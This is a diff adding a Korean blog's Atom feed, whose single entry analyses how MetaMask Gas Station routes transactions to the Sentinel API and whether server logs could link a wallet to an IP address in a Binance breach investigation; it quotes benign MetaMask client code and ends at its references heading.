@@ -1,0 +1,268 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko">
+    <title>Degen - RealWorld</title>
+    <subtitle>Zola + Duckquill</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://nogie-dev.github.io/tags/realworld/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://nogie-dev.github.io"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2026-10-30T00:00:00+00:00</updated>
+    <id>https://nogie-dev.github.io/tags/realworld/atom.xml</id>
+    <entry xml:lang="ko">
+        <title>MetaMask Gas Station의 거래 제출 경로와 IP 추적 가능성</title>
+        <published>2026-10-30T00:00:00+00:00</published>
+        <updated>2026-10-30T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://nogie-dev.github.io/blog/metamask-gas-station-ip-trace/"/>
+        <id>https://nogie-dev.github.io/blog/metamask-gas-station-ip-trace/</id>
+        
+        <content type="html" xml:base="https://nogie-dev.github.io/blog/metamask-gas-station-ip-trace/">&lt;p&gt;바이낸스 침해 사건을 분석하던 Justin Kalland는 공격자가 사용한 것으로 지목된 지갑에서 MetaMask Gas Station 사용 흔적을 발견했다고 제보했습니다. &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;x.com&#x2F;justinkalland&#x2F;status&#x2F;2115946980665151955?a=ViZrzcnhc0LYIZrr_M4&amp;amp;s=20&quot;&gt;글&lt;&#x2F;a&gt;에 따르면 같은 블록에서 Gas Station이 ETH를 보낸 뒤 해당 지갑은 Kyber 라우터에 USDT 사용 권한을 부여하고 Gas Station에 USDT를 지급했습니다. 지갑에 ETH가 있었는데도 토큰으로 가스비를 냈다는 설명입니다.&lt;&#x2F;p&gt;
+&lt;p&gt;Kalland는 이 글에서 ETH 보충량이 뒤이은 두 거래의 최대 가스 예산 합과 wei 단위까지 일치했다고 설명했습니다. 같은 블록의 거래 순서와 이 수량 관계를 Gas Station 사용의 근거로 제시한 것입니다.&lt;&#x2F;p&gt;
+&lt;p&gt;MetaMask 공식 계정은 해당 글에 “보안팀이 이 제보를 인지하고 조사 중”이라고 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;x.com&#x2F;MetaMask&#x2F;status&#x2F;2115977377989955778&quot;&gt;답했습니다&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;figure&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;metamask-gas-station&#x2F;metamask-official-reply.jpg&quot; alt=&quot;MetaMask 공식 계정이 보안팀의 조사 사실을 알린 X 답변&quot; width=&quot;332&quot; height=&quot;153&quot; style=&quot;height: auto;&quot; loading=&quot;lazy&quot;&gt;
+&lt;figcaption&gt;제보에 대한 MetaMask 공식 계정의 답변&lt;&#x2F;figcaption&gt;
+&lt;&#x2F;figure&gt;
+&lt;p&gt;이 글에서는 거래의 제출 경로를 살펴봅니다. Gas Station을 이용하면서 MetaMask 서버에 요청을 보냈다면 해당 서버의 접속 기록도 조사 대상이 됩니다. 공개 코드에서는 이 요청이 어디로 전송되고 어떤 정보를 담는지 확인할 수 있습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;metamask-gas-stationeul-iyonghan-georaega-beulroge-pohamdoegiggaji&quot;&gt;MetaMask Gas Station을 이용한 거래가 블록에 포함되기까지&lt;&#x2F;h2&gt;
+&lt;p&gt;Sentinel은 MetaMask Wallet이 거래 시뮬레이션과 제출을 요청하고 처리 상태를 조회하는 백엔드 API입니다. 이번에 살펴본 Gas Station 경로에서 거래가 정상적으로 처리될 때의 큰 흐름은 다음과 같습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;MetaMask Wallet에서 거래 준비와 서명 → Sentinel API로 요청 전송 → 백엔드의 거래 제출 처리 → 이더리움 블록에 포함&lt;&#x2F;p&gt;
+&lt;p&gt;Ethereum Mainnet의 기본 API 주소는 &lt;code&gt;https:&#x2F;&#x2F;tx-sentinel-ethereum-mainnet.api.cx.metamask.io&#x2F;&lt;&#x2F;code&gt;입니다. API 주소는 네트워크별 설정에 따라 달라집니다.&lt;&#x2F;p&gt;
+&lt;p&gt;7702 Relay가 사용하는 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;core&#x2F;blob&#x2F;b8d07a5a7731c565ad6c49b555b21b7cceedce61&#x2F;packages&#x2F;sentinel-api-service&#x2F;src&#x2F;sentinel-api-service.ts#L392-L408&quot;&gt;JSON-RPC 클라이언트 코드&lt;&#x2F;a&gt;에는 다음과 같은 요청 구성이 있습니다.&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;typescript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; response&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; = await&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; this&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;#fetch&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;, {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  method:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;#39;POST&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  headers: {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    ...&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt;    &amp;#39;Content-Type&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;#39;application&#x2F;json&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  },&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  body:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; JSON&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;stringify&lt;&#x2F;span&gt;&lt;span&gt;({&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    id:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    jsonrpc:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;#39;2.0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;    method&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;    params&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  }),&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;});&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;MetaMask는 이 코드로 Sentinel에 보낼 HTTP 요청을 구성합니다. &lt;code&gt;method&lt;&#x2F;code&gt;에는 호출할 API 이름이, &lt;code&gt;params&lt;&#x2F;code&gt;에는 요청 데이터가 들어갑니다. 7702 Relay에서는 이 방식으로 &lt;code&gt;eth_sendRelayTransaction&lt;&#x2F;code&gt;을 호출합니다.&lt;&#x2F;p&gt;
+&lt;p&gt;이 제출 요청을 받는 쪽은 Sentinel입니다. 요청을 받는 HTTPS 수신 지점에서는 접속 IP와 요청 내용을 함께 확인할 수 있습니다. 요청 데이터에서 사용자 지갑을 식별할 수 있다면 해당 지갑의 요청과 접속 IP를 연결할 여지가 생깁니다.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;metamask-gas-station&#x2F;ip-trace-sketch-en.png&quot; alt=&quot;일반 RPC와 MetaMask Gas Station의 제출 경로 및 IP 관측 지점 비교&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;이 비교 그림에서 실선은 클라이언트 코드에서 확인한 요청 경로를 나타냅니다. 점선으로 표시한 서버 내부의 처리 과정은 직접 확인하지 못했습니다. 노란 상자는 서버가 기록을 보관하고 이를 거래와 연결할 수 있을 때의 예시입니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;ilban-rpc-jeculgwa-gas-station-jeculyi-cai&quot;&gt;일반 RPC 제출과 Gas Station 제출의 차이&lt;&#x2F;h2&gt;
+&lt;p&gt;일반적인 RPC 제출에서는 지갑이 설정된 RPC에 &lt;code&gt;eth_sendRawTransaction&lt;&#x2F;code&gt;을 보냅니다. 이번에 분석한 Gas Station의 두 경로는 제출 요청을 Sentinel로 보냅니다. MetaMask 지갑은 계정 유형과 네트워크 지원 조건 등에 따라 거래를 제출할 방식을 선택합니다.&lt;&#x2F;p&gt;
+&lt;p&gt;그림의 주황색 상자는 서버가 접속 상대의 IP와 거래 요청을 함께 확인할 수 있는 지점입니다. 일반 RPC 서버와 Sentinel 서버 모두 여기에 해당합니다. IP는 네트워크 연결에서 관측하는 정보이며 거래의 기본 필드에는 들어 있지 않습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;Gas Station 사용 흔적은 요청을 받은 서비스를 좁히는 단서가 됩니다. 사건에서도 분석한 제출 경로를 사용했다면 접속 기록을 확인할 대상은 MetaMask의 Sentinel 서버입니다. Kalland가 MetaMask에 오프체인 로그 보존을 요청한 것도 이 제출 경로 때문입니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;sentinele-jeondaldoeneun-jeongbo&quot;&gt;Sentinel에 전달되는 정보&lt;&#x2F;h2&gt;
+&lt;p&gt;공개 코드에서 확인한 두 제출 경로는 Smart Transactions(STX) 번들 제출과 7702 Relay 제출입니다. 둘 다 MetaMask가 구현한 Sentinel 호출 경로입니다.&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;제출 경로&lt;&#x2F;th&gt;&lt;th&gt;Sentinel에 보내는 정보&lt;&#x2F;th&gt;&lt;th&gt;지갑 주소를 확인하는 방법&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;STX 번들 제출&lt;&#x2F;td&gt;&lt;td&gt;사용자가 보내려는 트랜잭션과 가스비 결제용 트랜잭션을 각각 서명해 묶은 데이터. REST &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;core&#x2F;blob&#x2F;5c82ed964b68ede7cd6d1c045ddb593ac8bff437&#x2F;packages&#x2F;smart-transactions-controller&#x2F;src&#x2F;SmartTransactionsController.ts#L950-L988&quot;&gt;&lt;code&gt;submitTransactions&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;로 제출&lt;&#x2F;td&gt;&lt;td&gt;서명된 트랜잭션에서 발신 주소 복구&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;7702 Relay 제출&lt;&#x2F;td&gt;&lt;td&gt;서명된 위임과 실행 데이터. JSON-RPC &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;blob&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&#x2F;app&#x2F;scripts&#x2F;lib&#x2F;transaction&#x2F;hooks&#x2F;delegation-7702-publish.ts#L158-L240&quot;&gt;&lt;code&gt;eth_sendRelayTransaction&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;으로 제출&lt;&#x2F;td&gt;&lt;td&gt;&lt;code&gt;data&lt;&#x2F;code&gt;에 인코딩된 위임에서 사용자 주소 확인&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;p&gt;7702 Relay는 EIP-7702를 활용한 MetaMask의 릴레이 제출 방식입니다. 여기서 JSON-RPC는 요청과 응답의 형식을 뜻하며 이 요청의 수신처도 Sentinel입니다.&lt;&#x2F;p&gt;
+&lt;p&gt;7702 Relay는 사용자 주소를 제출할 &lt;code&gt;data&lt;&#x2F;code&gt; 안의 위임에 담습니다. 아래 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;blob&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&#x2F;app&#x2F;scripts&#x2F;lib&#x2F;transaction&#x2F;delegation.ts#L298-L317&quot;&gt;위임 구성 코드&lt;&#x2F;a&gt;는 사용자 지갑 주소인 &lt;code&gt;transaction.txParams.from&lt;&#x2F;code&gt;을 &lt;code&gt;delegator&lt;&#x2F;code&gt;에 넣습니다.&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;typescript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; unsignedDelegation&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt; UnsignedDelegation&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  delegator:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transaction&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;txParams&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; as&lt;&#x2F;span&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt; Hex&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  delegate:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; delegatee&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; ??&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; ANY_BENEFICIARY&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  authority:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; ROOT_AUTHORITY&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;  salt&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;  caveats&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;};&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;delegator&lt;&#x2F;code&gt;에 넣은 주소는 이후 위임을 서명하고 인코딩하는 과정에서 실행 데이터와 함께 제출할 &lt;code&gt;data&lt;&#x2F;code&gt;에 포함됩니다. Sentinel은 ABI 형식의 요청 데이터를 디코딩해 사용자 주소를 읽을 수 있습니다. 이 요청을 받은 HTTPS 수신 지점에서 접속 IP도 관측한다면 어느 지갑의 요청이 어느 IP에서 왔는지 함께 확인할 수 있습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;거래 승인 전에도 서버와 통신할 수 있습니다. 시뮬레이션이 켜져 있고 지원 조건이 맞으면 지갑은 거래 승인을 기다리는 동안 &lt;code&gt;infura_simulateTransactions&lt;&#x2F;code&gt;를 호출해 토큰으로 낼 가스비를 조회할 수 있습니다. 이 견적 요청에는 사용자 주소가 &lt;code&gt;from&lt;&#x2F;code&gt; 필드로 들어가며 목적지와 호출 데이터도 포함될 수 있습니다. 사용자가 나중에 거래를 거절해도 이미 전송한 요청을 되돌릴 수는 없습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;제출 경로는 지갑 버전과 네트워크 및 계정 유형에 따라 달라집니다. STX와 sendBundle 지원 여부나 7702 지원 조건도 영향을 주며 Transaction Pay 같은 별도 경로도 있습니다. Gas Station 사용 흔적만으로 사건 당시의 API와 지갑 버전까지 확정할 수는 없습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;ipwa-haedang-georaeyi-yeongyeoljeom&quot;&gt;IP와 해당 거래의 연결점&lt;&#x2F;h2&gt;
+&lt;p&gt;HTTPS 연결을 받는 인프라는 접속 상대의 IP를 처리합니다. TLS 연결을 종료하는 서버에서는 복호화된 요청 내용도 읽을 수 있습니다. 요청에 지갑 주소가 들어 있거나 서명과 위임 데이터에서 주소를 알아낼 수 있다면 수신자는 접속 IP와 지갑 주소를 함께 확인할 수 있습니다. 이 IP가 내부 애플리케이션에도 전달되는지는 프록시 설정에 달려 있습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;사후에 이 관계를 추적하려면 기록이 남아 있어야 합니다. 예를 들어 접속 로그에 IP와 시각 및 요청 식별자를 남기고 거래 처리 로그에 지갑 주소와 제출 식별자 또는 해시를 따로 기록할 수 있습니다. 두 기록이 같은 요청을 가리킨다는 것을 확인할 식별자나 자료가 있어야 서로 연결할 수 있습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;Sentinel은 제출 요청의 처리 상태를 조회할 때 사용할 UUID를 반환합니다. 지갑은 이 UUID로 처리 결과를 조회하고 상태가 &lt;code&gt;PENDING&lt;&#x2F;code&gt;이면 조회를 반복합니다. 아래 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;blob&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&#x2F;app&#x2F;scripts&#x2F;lib&#x2F;transaction&#x2F;transaction-relay.ts#L58-L114&quot;&gt;결과 조회 코드&lt;&#x2F;a&gt;는 그중 한 번의 조회를 보여줍니다.&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;typescript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transactions&lt;&#x2F;span&gt;&lt;span&gt; }&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; = await&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; getSentinelApiMessenger&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt;  &amp;#39;SentinelApiService:getSmartTransaction&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  {&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; chainId&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; uuid&lt;&#x2F;span&gt;&lt;span&gt; },&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt;&amp;#39;Polling response&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transactions&lt;&#x2F;span&gt;&lt;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transaction&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transactions&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  status:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transaction&lt;&#x2F;span&gt;&lt;span&gt;?.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;status&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; as string&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  transactionHash:&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; transaction&lt;&#x2F;span&gt;&lt;span&gt;?.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; as&lt;&#x2F;span&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt; Hex&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; | undefined&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;};&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;이 코드는 UUID로 받은 조회 결과에서 첫 번째 거래의 상태와 해시를 읽습니다. &lt;code&gt;hash&lt;&#x2F;code&gt;가 아직 없으면 &lt;code&gt;transactionHash&lt;&#x2F;code&gt;는 &lt;code&gt;undefined&lt;&#x2F;code&gt;가 됩니다. 지갑은 이 응답에서 제출 UUID에 해당하는 온체인 거래 해시를 얻습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;log(...)&lt;&#x2F;code&gt;는 조회 응답을 지갑 쪽 디버그 로그에 출력합니다.&lt;&#x2F;p&gt;
+&lt;p&gt;서버에 UUID와 원래 제출 요청의 대응 관계가 보관돼 있고 그 요청을 접속 로그와 연결할 수 있다면 이미 알고 있는 온체인 거래 해시를 단서로 제출 요청과 접속 IP를 찾아볼 여지가 있습니다.&lt;&#x2F;p&gt;
+&lt;figure id=&quot;relay-sequence&quot;&gt;
+&lt;a href=&quot;&#x2F;img&#x2F;metamask-gas-station&#x2F;7702-relay-sequence.svg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;metamask-gas-station&#x2F;7702-relay-sequence.png&quot; alt=&quot;MetaMask Wallet, Sentinel API, Blockchain 세 열로 나타낸 7702 Relay 제출과 UUID 결과 조회 구조&quot; width=&quot;1500&quot; height=&quot;2075&quot; style=&quot;height: auto;&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot;&gt;
+&lt;&#x2F;a&gt;
+&lt;figcaption&gt;7702 Relay의 요청과 응답&lt;&#x2F;figcaption&gt;
+&lt;&#x2F;figure&gt;
+&lt;p&gt;위쪽의 실선 가로 화살표는 요청을, 점선 가로 화살표는 응답을 나타냅니다. 아래쪽의 온체인 제출은 개념적으로 표시했으며 UUID 응답이나 결과 조회와의 실제 선후 관계를 뜻하지 않습니다. 거래 해시는 블록에 포함되기 전에도 존재합니다.&lt;&#x2F;p&gt;
+&lt;p&gt;STX 경로에서는 서명된 트랜잭션이 보관돼 있다면 그 해시를 계산해 온체인 거래와 대조할 수 있습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;백엔드에 해당 거래와 연결할 수 있는 접속 로그가 보관돼 있다면 요청에 사용된 IP를 확인할 여지는 있습니다. 다만 VPN이나 프록시 같은 중계 수단을 거쳤다면 그 기록에 남는 주소는 중계 서버의 출구 IP일 수 있습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;www.trmlabs.com&#x2F;resources&#x2F;blog&#x2F;north-korea-steals-usd-6-36-billion-from-binance-in-the-largest-hack-in-history&quot;&gt;TRM Labs&lt;&#x2F;a&gt;는 이번 사건의 배후를 북한의 TraderTraitor로 지목했습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;북한 연계 조직의 공격이라는 분석이 맞더라도 공격자가 VPN이나 프록시를 거쳐 요청을 보냈다면 MetaMask 서버에는 공격자의 원래 IP 대신 중계 서버의 IP가 기록될 수 있습니다. 이 경우 접속 기록만으로 공격자의 실제 위치나 신원을 특정하기는 어렵습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;hwaginhan-beomwi&quot;&gt;확인한 범위&lt;&#x2F;h2&gt;
+&lt;p&gt;공개 클라이언트에서 확인한 것은 Sentinel에 보내는 요청과 그 안에 담기는 거래 정보입니다. 서버의 로그 항목이나 보관 방식은 이 코드로 확인할 수 없습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;legal.consensys.io&#x2F;metamask&#x2F;privacy-policy&#x2F;&quot;&gt;MetaMask 개인정보 처리방침&lt;&#x2F;a&gt;은 기능 제공과 보안 등에 필요한 경우 IP를 일시적으로 처리한다고 설명합니다. Sentinel이 IP를 지갑 주소나 UUID와 연결해 보관하는지와 그 기간은 이 문서만으로 알 수 없습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;분석 기준은 2026년 10월 30일의 Extension 13.56.0 공개 소스와 잠금 파일에 고정된 패키지 버전입니다. 기준 커밋은 &lt;code&gt;0997172&lt;&#x2F;code&gt;입니다. 조사 당시 최신 공개 릴리스였던 13.55.0의 전체 의존 경로가 분석 기준 소스와 같은지는 검증하지 않았습니다. 사건 당시 설치본의 버전도 확인하지 못했습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;camgo-jaryo&quot;&gt;참고 자료&lt;&#x2F;h2&gt;
